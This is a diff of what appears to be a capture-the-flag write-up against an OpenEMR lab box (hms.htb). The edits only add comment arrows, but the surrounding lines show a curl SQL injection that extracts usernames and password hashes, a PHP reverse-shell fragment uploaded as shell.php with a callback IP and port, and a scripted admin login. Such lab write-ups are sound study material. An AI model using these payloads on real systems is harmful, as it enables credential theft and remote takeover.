@@ -73,7 +73,7 @@ curl -i -s -k -X $'GET' \
 -H $'Accept: */*' \
 -H $'Accept-Encoding: gzip, deflate' \
 -H $'Connection: close' \
--b $'PHPSESSID=n30rpgmfkjg559hcov0iiurc92' \
+-b $'PHPSESSID=n30rpgmfkjg559hcov0iiurc92' \ # <------ Cookie to change
 $'http://hms.htb/portal/add_edit_event_user.php?eid=-2059%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CCONCAT%280x4141414141%2CIFNULL%28CAST%28password%20AS%20NCHAR%29%2C0x20%29%2C0x4141414141%2CIFNULL%28CAST%28username%20AS%20NCHAR%29%2C0x20%29%2C0x4141414141%29%2CNULL%20FROM%20openemr.users_secure--%20-' | tail -n2 | gunzip | awk -F "AAAAA" '{print "password: "$2;print "username: "$3}'
 ```
 
@@ -114,8 +114,8 @@ payload = {'site': 'default', 'mode' : 'save', 'docid' : 'shell.php', 'content' 
 
 set_time_limit (0);
 $VERSION = "1.0";
-$ip = 'X.X.X.X';  # Change this your IP
-$port = 9001;       # Change this
+$ip = 'X.X.X.X';  # <--- Change this your IP
+$port = 9001;       # <--- Change this
 $chunk_size = 1400;
 $write_a = null;
 $error_a = null;
@@ -260,8 +260,8 @@ url = "http://hms.htb/interface/main/main_screen.php?auth=login&site=default" # 
 data= {
     'new_login_session_management' : '1',
     'authProvider' : 'Default',
-    'authUser' : 'openemr_admin', # changed this to the username I found in the database
-    'clearPass' : 'xxxxxx',       # changed this to the appropriate password 
+    'authUser' : 'openemr_admin', # <---- changed this to the username I found in the database
+    'clearPass' : 'xxxxxx',       # <---- changed this to the appropriate password 
     'languageChoice' : '1',
     }
     
